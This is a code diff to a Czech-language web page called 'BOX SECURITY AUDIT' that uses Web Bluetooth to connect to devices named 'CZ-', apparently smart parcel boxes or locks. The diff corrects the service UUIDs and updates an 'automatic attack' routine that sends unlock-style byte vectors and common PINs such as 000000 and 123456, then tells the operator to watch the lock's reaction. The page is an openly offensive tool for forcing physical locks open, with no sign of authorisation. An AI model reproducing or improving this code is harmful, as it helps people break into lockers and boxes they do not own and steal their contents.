@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BOX SECURITY AUDIT v3.0 🔱</title>
+    <title>BOX SECURITY AUDIT v3.1 🔱</title>
     <style>
         body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 15px; margin: 0; }
         .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
@@ -47,9 +47,9 @@
     let device, server, service, characteristic;
     let deviceName = "";
 
-    // UUID definované systémem CZ-LOKJ (z tvých fotek)
-    const SERVICE_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c65';
-    const CHARACTERISTIC_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c-31';
+    // OPRAVENÁ UUID S POMLČKAMI (Zjištěno z tvých dat v nRF Connect)
+    const SERVICE_UUID = '7a626f78-0ad1-46c3-9fc9-fbd4bdc5d197';
+    const CHARACTERISTIC_UUID = '7a626f7a-0ad1-46c3-9fc9-fbd4bdc5d197';
 
     function log(msg) {
         const logDiv = document.getElementById('log');
@@ -61,6 +61,7 @@
     async function connect() {
         try {
             log("Skenuji okolí pro CZ- zařízení...");
+            // Chrome vyžaduje přesný formát UUID, jinak hodí TypeError
             device = await navigator.bluetooth.requestDevice({
                 filters: [{ namePrefix: 'CZ-' }],
                 optionalServices: [SERVICE_UUID]
@@ -78,7 +79,7 @@
             log("✅ SPOJENÍ NAVÁZÁNO. Exploit kanál otevřen.");
 
         } catch (error) {
-            log("❌ CHYBA PŘIPOJENÍ: " + error);
+            log("❌ CHYBA: " + error);
         }
     }
 
@@ -96,24 +97,23 @@
     async function startAutoAttack() {
         log("🚀 SPUŠTĚN AUTOMATICKÝ ÚTOK...");
         
-        // Seznam testovacích vektorů
         const vectors = [
             { name: "Global Open", data: new Uint8Array([0x01]) },
             { name: "Zero Reset", data: new Uint8Array([0x00]) },
             { name: "Double Confirm", data: new Uint8Array([0x01, 0x01]) },
             { name: "Full Burst", data: new Uint8Array([0xFF, 0xFF, 0xFF, 0xFF]) },
             { name: "Device Name Key", data: new TextEncoder().encode(deviceName) },
-            { name: "Common PIN 0000", data: new TextEncoder().encode("0000") },
-            { name: "Common PIN 1234", data: new TextEncoder().encode("1234") }
+            { name: "Common PIN 0000", data: new TextEncoder().encode("000000") },
+            { name: "Common PIN 1234", data: new TextEncoder().encode("123456") }
         ];
 
         for (const v of vectors) {
             log(`Testuji vektor: ${v.name}...`);
             const success = await sendRaw(v.data);
             if (success) log(`✅ Paket ${v.name} doručen.`);
-            await new Promise(r => setTimeout(r, 600)); // Pauza pro zpracování boxem
+            await new Promise(r => setTimeout(r, 800)); // Mírně delší pauza pro stabilitu
         }
-        log("🏁 ÚTOK DOKONČEN. Sleduj mechanickou reakci boxu.");
+        log("🏁 ÚTOK DOKONČEN. Sleduj reakci zámku.");
     }
 
     async function sendManualText() {
